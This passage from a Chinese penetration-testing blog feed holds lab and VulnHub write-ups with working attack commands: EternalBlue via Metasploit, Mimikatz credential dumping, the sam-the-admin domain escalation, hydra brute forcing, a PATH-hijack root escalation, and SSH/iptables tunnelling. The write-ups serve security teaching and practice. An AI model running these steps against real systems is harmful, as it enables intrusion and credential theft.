src="https://s2.loli.net/2021/12/25/hZ8RaToDQHGbutX.png"></p><h3 id="MSF设置Socks-代理"><a href="#MSF设置Socks-代理" class="headerlink" title="MSF设置Socks 代理"></a>MSF设置Socks 代理</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">setg</span> Proxies socks5:<span class="number">192.168.124.7:7777</span></span><br><span class="line">setg ReverseAllowProxy <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/25/RNX9WnoepZrf3wu.png"></p><p>使用 <code>smb</code> 版本探测模块对目标进行扫描：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> auxiliary/scanner/smb/smb_version</span><br><span class="line"><span class="keyword">set</span> rhosts <span class="number">10.0</span><span class="number">.1</span><span class="number">.7</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/25/JuiYcMgrLHnzGqw.png"></p><p>发现目标 <code>10.0.1.7</code>系统 版本是 <code>Windows 7</code>，且存在域 <code>REDTEAM</code></p><p>接着探测目标是否存在经典的<code>MS17-010</code>漏洞</p><h3 id="MS17-010-漏洞探测与利用"><a href="#MS17-010-漏洞探测与利用" class="headerlink" title="MS17-010 漏洞探测与利用"></a>MS17-010 漏洞探测与利用</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">use</span> auxiliary/scanner/smb/smb_ms<span class="number">17</span>_<span class="number">010</span></span><br><span class="line"><span class="attribute">set</span> rhosts <span class="number">10.0.1.7</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/25/Mx7V4XuLn9gImwy.png"></p><p>目标主机<code>win7</code>确实存在<code>永恒之蓝</code>漏洞</p><p>接下来我们继续使用<code>MSF</code>的模块进行漏洞利用，由于目标机器不一定出网，我们选择用正向连接的<code>payload</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">use</span> windows/smb/ms<span class="number">17</span>_<span class="number">010</span>_eternalblue</span><br><span class="line"><span class="attribute">set</span> payload windows/x<span class="number">64</span>/meterpreter/bind_tcp</span><br><span class="line"><span class="attribute">set</span> rhosts <span class="number">10.0.1.7</span></span><br><span class="line"><span class="attribute">run</span></span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2021/12/25/wMnTPC3NlLJ9AgK.png" style="zoom: 80%;" /><p>成功获得一个<code>meterpreter</code></p><p><img src="https://s2.loli.net/2021/12/25/jDzbevUSNAP1LVu.png"></p><p>拿到 <code>Win7</code> 权限后加载 <code>Mimikatz</code> 抓取明文密码</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">load mimikatz</span></span><br><span class="line"><span class="attribute">creds_all</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/25/K7d4GxDLbOzhECN.png"></p><p>此时我们得到了一个域用户的账号密码</p><h2 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h2><h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hostname</span><br><span class="line">net <span class="keyword">user</span> <span class="title">/domain</span></span><br><span class="line">ipconfig</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/25/wLe1nTbmszfFRSu.png"></p><p><img src="https://s2.loli.net/2021/12/25/P4INuV6HBbDZhaR.png"></p><p>发现<code>win7</code>还有一个内网网卡，接着我们需要定位域控</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net <span class="keyword">group</span> &quot;Domain Controllers&quot; /<span class="keyword">domain</span></span><br><span class="line">ping DC</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/25/grtlYL3HQ4JcWwU.png"></p><p>定位到域控到域控 <code>IP</code> 为 <code>10.0.0.12</code> ，接下来直接尝试最近爆出的两个域内核武器漏洞：CVE-2021-42287、CVE-2021-42278</p><p><strong>具体：</strong><a href="https://mp.weixin.qq.com/s?__biz=MzkzNzMxNDc5Mg==&mid=2247483681&idx=1&sn=5757667e1a2f812244fe17b50ce46c27&chksm=c29011a6f5e798b089099860b7754babafd39154911a64a53669da882df6dec5118cf7942414&scene=21#wechat_redirect">只需要一个域用户即可拿到 DC 权限（CVE-2021-42287 and CVE-2021-42278）</a></p><h3 id="MSF流量转发"><a href="#MSF流量转发" class="headerlink" title="MSF流量转发"></a>MSF流量转发</h3><p>我们先将<code>win7</code>的流量代理出来，然后在<code>Kali</code>中实现域内提权</p><p>先添加路由：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">run</span> autoroute -s <span class="number">10.0.0.7</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/25/rQkhlwGEZcsm9zK.png"></p><p>使用 MSF 添加了一个 Socks：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/25/GHaZPjcoNR8Dwnu.png"></p><p>接着修改<code>proxychain</code>配置文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>proxychains4.conf</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/25/nkmBMlRVItbWEsh.png"></p><p>直接使用<a href="https://github.com/WazeHell/sam-the-admin">脚本</a>利用漏洞进行域内提权</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains <span class="keyword">python3</span> sam_the_admin.<span class="keyword">py</span> <span class="string">&quot;redteam/root:Red12345&quot;</span> -dc-ip <span class="number">10.0</span>.<span class="number">0.12</span> -<span class="keyword">shell</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/25/sojU6f8SKgOC7vb.png"></p><p>最后拿到最终的flag</p><p><img src="https://s2.loli.net/2021/12/25/TktQN23dHpwsiJh.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH转发和iptables端口转发</title>
      <link href="/2021/12/02/SSH%E8%BD%AC%E5%8F%91%E5%92%8Ciptables%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
      <url>/2021/12/02/SSH%E8%BD%AC%E5%8F%91%E5%92%8Ciptables%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<h2 id="SSH端口转发简介"><a href="#SSH端口转发简介" class="headerlink" title="SSH端口转发简介"></a>SSH端口转发简介</h2><p>SSH会自动加密和解密所有SSH客户端与服务端之间的网络数据。SSH还能够将其他TCP端口的网络数据通过SSH链接来转发，并且自动提供了相应的加密及解密服务。这一过程也被叫做”<strong>隧道</strong>“（tunneling），这是因为SSH为其他TCP链接提供了一个安全的通道来进行传输而得名。例如，Telnet ，SMTP ，LDAP这些TCP应用均能够从中得益，避免了用户名，密码以及隐私信息的明文传输。而与此同时，如果工作环境许中的防火墙限制了一些网络端口的使用，但是允许SSH的连接，也能够将通过将TCP用端口转发来使用SSH进行通讯。</p><p><strong>SSH端口转发的两大功能</strong>：</p><ul><li>加密SSH Client端至SSH Server端之间的通讯数据。</li><li>突破防火墙的简直完成一些之前无法建立的TCP连接。</li></ul><h2 id="SSH本地SOCKS5代理"><a href="#SSH本地SOCKS5代理" class="headerlink" title="SSH本地SOCKS5代理"></a>SSH本地SOCKS5代理</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -qTfnN -D <span class="number">7777</span> <span class="symbol">username@</span>remotehost</span><br></pre></td></tr></table></figure><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">参数说明：</span><br><span class="line"><span class="deletion">-C  压缩数据</span></span><br><span class="line"><span class="deletion">-q  安静模式</span></span><br><span class="line"><span class="deletion">-T  禁止远程分配终端</span></span><br><span class="line"><span class="deletion">-n  关闭标准输入</span></span><br><span class="line"><span class="deletion">-N  不执行远程命令</span></span><br><span class="line"><span class="deletion">-f  ssh后台运行</span></span><br><span class="line"><span class="deletion">-D  本地的端口</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/12/02/v4W65cV3yq9xikr.png"></p><p>浏览器开启代理：</p><p><img src="https://i.loli.net/2021/12/02/bUxjd9nwPiaOGeJ.png"></p><p>IP地址已经发生变化：</p><p><img src="https://i.loli.net/2021/12/02/UX8ovdIgrj1ZaTp.png"></p><h2 id="SSH本地转发"><a href="#SSH本地转发" class="headerlink" title="SSH本地转发"></a>SSH本地转发</h2><p><strong>场景：</strong></p><ol><li>本机能与中间服务器互通</li><li>中间服务器能与目标机器互通，中间服务器已拿到目标机器权限</li><li>本地不能直接访问目标机器</li><li>目标机器不出网</li><li>目的：本机能访问目标机器</li></ol><p><strong>命令：</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L localport<span class="selector-pseudo">:target</span>host<span class="selector-pseudo">:target</span>port username<span class="keyword">@sshserver</span></span><br></pre></td></tr></table></figure><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">localport</span>       本机开启的端口</span><br><span class="line"><span class="symbol">targethost</span>      目标机器的<span class="built_in">IP</span>地址</span><br><span class="line"><span class="symbol">targetport</span>  目标机器的端口</span><br><span class="line"><span class="symbol">username</span>中间服务器的用户名</span><br><span class="line"><span class="symbol">sshserver</span>       中间服务器的<span class="built_in">IP</span>地址</span><br></pre></td></tr></table></figure><p><strong>结果：</strong></p><p>此时，在在本机访问localport就可以访问目标主机的targetport了</p><h2 id="SSH远程转发"><a href="#SSH远程转发" class="headerlink" title="SSH远程转发"></a>SSH远程转发</h2><p>反向连接的一种，可以穿透内网防火墙，在内网中比较好用</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -R sshserverport<span class="selector-pseudo">:target</span>host<span class="selector-pseudo">:target</span>port username<span class="keyword">@sshserver</span></span><br></pre></td></tr></table></figure><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">sshserverpor</span>        中间服务器的端口号</span><br><span class="line"><span class="symbol">targethost</span>          目标机器的<span class="built_in">IP</span>地址</span><br><span class="line"><span class="symbol">targetport</span>      目标机器的端口</span><br><span class="line"><span class="symbol">username</span>中间服务器的用户名</span><br><span class="line"><span class="symbol">sshserver</span>           中间服务器的<span class="built_in">IP</span>地址</span><br></pre></td></tr></table></figure><p><strong>开启远程需要更改配置</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo vim <span class="regexp">/etc/</span>ssh/sshd_config</span><br><span class="line"><span class="comment">#任何人访问这台机器的某一个端口，都可以访问到目标机的映射出的端口；这个需要在中间服务器上开启</span></span><br><span class="line">GatewayPorts    yes</span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="regexp">/etc/</span>ssh/sshd_config restart   <span class="comment">#重启SSH</span></span><br></pre></td></tr></table></figure><p><strong>因为是反向连接，所以肯定需要在目标机器上执行命令</strong></p><p>在目标机器上执行命令：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh</span> -R <span class="number">8899</span>:<span class="number">10.10.10.132:80</span> test@<span class="number">10.10.10.135</span> </span><br><span class="line"><span class="comment">#把目标机的80端口转发到10.10.10.135(中间服务器)上的8899端口</span></span><br></pre></td></tr></table></figure><p>现在任何机器，只要访问10.10.10.13这台中间服务器的8899端口，就相当于访问了不出网的内网10.10.10.132机器的80端口</p><h2 id="iptables端口转发"><a href="#iptables端口转发" class="headerlink" title="iptables端口转发"></a>iptables端口转发</h2><h3 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h3><ol><li><p>修改内核文件实现端口转发</p><p><strong>方法1：</strong></p></li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.编辑sysctl配置文件 vim <span class="regexp">/etc/</span>sysctl.conf</span><br><span class="line"><span class="number">2</span>.开启ipv4 forward</span><br></pre></td></tr></table></figure><p>​        <strong>方法2</strong>： 直接sysctl修改</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用sysctl -w net.ipv4.<span class="attribute">ip_forward</span>=1</span><br><span class="line">然后查看sysctl -p和之前修改的一样。</span><br></pre></td></tr></table></figure><h3 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h3><p>REDIRECT模式是防火墙所在的机子内部转发包或流到另一个端口，也就是所有接收的包只转发给本地端口。</p><p>将本机的 7777 端口转发到 6666 端口：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -<span class="selector-tag">A</span> PREROUTING -<span class="selector-tag">p</span> tcp --dport <span class="number">7777</span> -j REDIRECT --<span class="selector-tag">to</span>-port <span class="number">6666</span></span><br></pre></td></tr></table></figure><h3 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a>远程端口转发</h3><p>通过 1.168 的 6666 端口访问 1.8 的 7777 端口，在 1.168 上设置：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sysctl</span> -w net.ipv<span class="number">4</span>.ip_forward=<span class="number">1</span></span><br><span class="line"><span class="attribute">iptables</span> -t nat -A PREROUTING -p tcp --dport <span class="number">6666</span> -j DNAT --to-destination <span class="number">192.168.1.8:7777</span></span><br><span class="line"><span class="attribute">iptables</span> -t nat -A POSTROUTING -p tcp -d <span class="number">192.168.1.8</span> --dport <span class="number">7777</span> -j SNAT --to-source <span class="number">192.168.1.168</span></span><br></pre></td></tr></table></figure><h3 id="删除该端口转发"><a href="#删除该端口转发" class="headerlink" title="删除该端口转发"></a>删除该端口转发</h3><p>查看当前iptables 的 nat 表的所有规则：（不用 -t 指定表名默认的是指 filter 表）</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -<span class="keyword">nL</span> --<span class="keyword">line</span></span><br></pre></td></tr></table></figure><p>删除指定表的指定链上的规则， -D 并指定序号即可。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">iptables</span> -t nat -D PREROUTING <span class="number">1</span></span><br></pre></td></tr></table></figure><blockquote><p>参考：</p><p><a href="https://mp.weixin.qq.com/s/tri1ruKqc-YztdWC-JmznA">SSH代理转发</a></p><p><a href="https://www.cnblogs.com/keerya/p/7612715.html">SSH端口转发详解及实例</a></p><p><a href="https://www.freebuf.com/articles/web/289254.html">一文带你了解iptables用法及端口转发</a></p><p><a href="https://blog.csdn.net/zhouguoqionghai/article/details/81947603">iptables 端口转发</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 端口转发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ICA1 VulnHub Walkthrough</title>
      <link href="/2021/11/01/ICA1-VulnHub-Walkthrough/"/>
      <url>/2021/11/01/ICA1-VulnHub-Walkthrough/</url>
      
        <content type="html"><![CDATA[<h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">arp-scan -l</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/01/DtOf6MJVR5ndoGe.png"></p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -Pn -p- <span class="number">192.168.62.182</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/01/xCtO6cIAsQMSLDi.png"></p><p>开放了22、80、3306端口</p><p>访问80端口，是一个登录界面</p><img src="https://i.loli.net/2021/11/01/1ejgDTcrmNXdtRw.png" style="zoom:80%;" /><p>qdPM是一个开源的项目管理系统，基于<a href="http://www.oschina.net/p/symfony">Symfony</a>框架+PHP/MySQL开发，可以看到qdPM的版本为9.2</p><h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><p>搜索一下exploit-db看看有没有公开的exp</p><p><img src="https://i.loli.net/2021/11/01/yZIxHGg2QtN9LiS.png"></p><p>可以看到这个版本存在数据库敏感信息泄露，可以未授权获取数据库连接信息和密码</p><p>看一下利用方式</p><p><img src="https://i.loli.net/2021/11/01/6NC3oaG9FzRYWrl.png"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>我们可以通过访问<code>http://&lt;website&gt;/core/config/databases.yml</code>来下载包含数据库连接信息和密码的yml文件</p><img src="https://i.loli.net/2021/11/01/4WVgx7HBS19dC2P.png" style="zoom:80%;" /><p>通过访问<code>http://192.168.62.182/core/config/databases.yml</code>成功得到了数据库的用户名和密码<code>qdpmadmin:UcVQCMQk2STVeS6J</code></p><p>接下来尝试登录数据库，进一步获取敏感信息</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mysql</span> -u qdpmadmin -h <span class="number">192.168.62.182</span> -p</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/01/CGJbOxwdtpsjXzD.png" style="zoom:80%;" /><p>在<code>staff</code>数据库中找到了五组用户名和密码，密码是经过编码加密的</p><img src="https://i.loli.net/2021/11/01/wFHBokpdDs89Aj3.png" style="zoom:80%;" /><h3 id="SSH密码爆破"><a href="#SSH密码爆破" class="headerlink" title="SSH密码爆破"></a>SSH密码爆破</h3><p>将经过base64编码的密码字符串解码一下，记录到一个文本中</p><p><img src="https://i.loli.net/2021/11/01/QaPujeoxcKYhXGm.png"></p><p>将用户名也记录到一个文本中</p><p><img src="https://i.loli.net/2021/11/01/ljuvOXPLYSUmhd5.png"></p><p>用账户密码来爆破80端口的登陆界面无果，只能尝试爆破22端口了</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L <span class="keyword">user</span> <span class="title">-P</span> password ssh://<span class="number">192.168</span>.<span class="number">62.182</span> -f</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/01/cskMQEIqhPKT2fY.png"></p><p><img src="https://i.loli.net/2021/11/01/rUxToiE435wZ62q.png"></p><p>成功得到了两组ssh的用户名和密码，尝试登录ssh</p><p>先登录<code>travis</code>账号，获取到了第一个flag</p><p><img src="https://i.loli.net/2021/11/01/tCaRQhxnyWjlABZ.png"></p><p>再登录<code>dexter</code>，看到有提示，应该是要利用可执行文件来提权</p><img src="https://i.loli.net/2021/11/01/i5gulQ2FmUo9j6b.png" style="zoom: 80%;" /><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>先查看一下有执行权限的文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">find</span> / -perm <span class="attribute">-u</span>=s 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/01/o3u5HCDSTckYPmG.png"></p><p>用strings查看一下<code>/opt/get_access</code></p><p><img src="https://i.loli.net/2021/11/01/BsXuYOF3ymfWdNl.png"></p><p>可以推测执行<code>/opt/get_access</code>时会进行<code>setuid</code>操作，接着会执行<code>cat</code>命令</p><p>为了证明我们的推测，我们对<code>get_access</code>进行反编译，我们通过伪代码可以比较清晰地看到，当执行<code>get_access</code>时会执行<code>setuid(0)</code>，再执行<code>cat</code>命令打印系统信息,并且执行的<code>cat</code>命令是没有指定路径的</p><img src="https://i.loli.net/2021/11/01/x7yHcPQhgoUrDG2.png" style="zoom: 80%;" /><p>接下来我们可以通过伪造一个文件名为<code>cat</code>的可执行文件，文件内容为<code>/bin/bash</code>，并将文件路径设置为环境变量，这样执行<code>get_access</code>的时候，就会执行我们伪造的<code>cat</code>文件，从而使我们获得root权限</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&#x27;/bin/bash&#x27;</span> &gt; <span class="regexp">/tmp/</span>cat</span><br><span class="line">chmod +x <span class="regexp">/tmp/</span>cat </span><br><span class="line">echo <span class="variable">$PATH</span></span><br><span class="line">export PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line"><span class="regexp">/opt/g</span>et_access</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/01/z4WNPo1MdavIbrs.png"></p><p>我们已经成功得到了root权限，最后我们通过<code>more</code>命令获取第二个flag</p><p><img src="https://i.loli.net/2021/11/01/yciWRaIrQzpNfk3.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnHhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>driftingblues4 VulnHub Walkthrough</title>
      <link href="/2021/10/14/driftingblues4-VulnHub-Walkthrough/"/>
      <url>/2021/10/14/driftingblues4-VulnHub-Walkthrough/</url>
      
        <content type="html"><![CDATA[<h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">arp-scan -l</span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/14/zhRLGB6DEPml2uv.png" style="zoom:67%;" /><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sC -sV -p- <span class="number">192.168.62.174</span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/14/zLTuWXdBhYVneoM.png" style="zoom: 67%;" /><p>开放了21、22、80端口，先看了下21端口，发现需要密码</p><img src="https://i.loli.net/2021/10/14/eoD7OHbsxQdl945.png" style="zoom:67%;" /><p>再访问一下80端口，看看有没有什么信息</p><p><img src="https://i.loli.net/2021/10/14/RutLqmjfi95sKAS.png"></p><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>主页没有什么信息，看一下源码</p><p><img src="https://i.loli.net/2021/10/14/y43jOYEQP1Wtmrz.png"></p><p>base64编码，到在线网站转换一下</p><img src="https://i.loli.net/2021/10/14/iPnKaR3Hxc45Q9r.png" style="zoom:50%;" /><p>再转换一次</p><img src="https://i.loli.net/2021/10/14/ITbCv2kKSmcjZhH.png" style="zoom:50%;" /><p>emmm，继续</p><img src="https://i.loli.net/2021/10/14/bLqOkQABpI4UN6v.png" style="zoom:50%;" /><img src="https://i.loli.net/2021/10/14/KkXxDfubgw8l7BE.png" style="zoom:50%;" /><p>最后得到一个txt的路径，访问一下</p><img src="https://i.loli.net/2021/10/14/sLfinMZNFSBem8y.png" style="zoom: 67%;" /><p>Brainfuck加密，到在线网站解密一下</p><p><img src="https://i.loli.net/2021/10/14/k8BNGWeDhpK4HcX.png"></p><p>得到了一张图片的路径，访问一下</p><p>是一个二维码</p><img src="https://i.loli.net/2021/10/14/S1lyGvhiRO5VoWk.png" style="zoom: 33%;" /><p>扫描的结果是一张图片地址</p><img src="https://i.loli.net/2021/10/14/ri9wbhBXtmn21Wv.png" style="zoom:80%;" /><p>访问一下</p><img src="https://i.imgur.com/a4JjS76.png" alt="img" style="zoom: 67%;" /><h4 id="弱密码爆破"><a href="#弱密码爆破" class="headerlink" title="弱密码爆破"></a>弱密码爆破</h4><p>提示了几个名字，试了ssh是不支持密码登录的，那就拿来爆破ftp试试</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L <span class="regexp">/home/</span>colin<span class="regexp">/桌面/u</span>ser -P <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>rockyou.txt ftp:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">62.174</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/14/TGkAwWjDZs5zoOQ.png"></p><p>成功得到了ftp的用户名和密码</p><p>用得到的用户名和密码成功登录ftp</p><img src="https://i.loli.net/2021/10/14/YBD1hf4sIgpbxve.png" style="zoom:80%;" /><p>看了一下好像没有什么信息，但是发现这个hubert目录是有写权限的，我们可以写一个ssh的key上去，然后在本地免密登录</p><h4 id="SSH免密登录"><a href="#SSH免密登录" class="headerlink" title="SSH免密登录"></a>SSH免密登录</h4><p>先在靶机的hubert目录下创建一个.ssh目录</p><p><img src="https://i.loli.net/2021/10/14/pCZK8LhMB3wRJH5.png"></p><p>将本地的authorized_keys上传到靶机</p><img src="https://i.loli.net/2021/10/14/T4Uo7cedGDLgWOC.png" style="zoom: 80%;" /><p>成功登录到ssh</p><img src="https://i.loli.net/2021/10/14/kiIhwnUrsYcEjJu.png" style="zoom:80%;" /><p>现在可以获取第一个flag了</p><img src="https://i.loli.net/2021/10/14/vQgpersjXcqxK7W.png" style="zoom: 67%;" /><h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><p>/home/hubert目录下还有一个python脚本</p><p><img src="https://i.loli.net/2021/10/14/zw8cIdiTj2N45Q6.png"></p><p>查看一下内容</p><img src="https://i.loli.net/2021/10/14/f9envx2HlPkoIVh.png" style="zoom:67%;" /><p>执行脚本会以root权限执行一个命令，将1输出到一个文件里，去看一下这个文件</p><img src="https://i.loli.net/2021/10/14/9KScPokfV6iRd4B.png" style="zoom:80%;" /><p>这个文件里已经有很多个1了，上面的python脚本应该是一直在执行的</p><p>将进程监控工具上传到靶机，看一下这个脚本的运行情况</p><p>先在本机起一个http服务</p><p><img src="https://i.loli.net/2021/10/14/lI4oASmUELGV5y1.png"></p><p>在靶机下载，并赋予执行权限</p><img src="https://i.loli.net/2021/10/14/zFAc2jdn5OeKxyR.png" style="zoom:80%;" /><p>发现emergency.py是每分钟执行一次的</p><img src="https://i.loli.net/2021/10/14/9a6mWdXpPG34buf.png" style="zoom: 67%;" /><p>接下来尝试通过新建一个emergency.py来提权</p><img src="https://i.loli.net/2021/10/14/Eglnj4rwqHaeAOo.png" style="zoom: 67%;" /><p>在本地开启一个监听端口来接收反弹的shell</p><p><img src="https://i.loli.net/2021/10/14/2vdQToUR1Bs5C3b.png"></p><p>等了一会之后，本地已经接收到了shell</p><p><img src="https://i.loli.net/2021/10/14/DIiKmceuLlbyo1X.png"></p><p>成功获取第二个flag</p><img src="https://i.loli.net/2021/10/14/QaX6UVWEoTiO5F3.png" style="zoom:67%;" />]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>driftingblues3 VulnHub Walkthrough</title>
      <link href="/2021/10/13/driftingblues3-VulnHub-Walkthrough/"/>
      <url>/2021/10/13/driftingblues3-VulnHub-Walkthrough/</url>
      
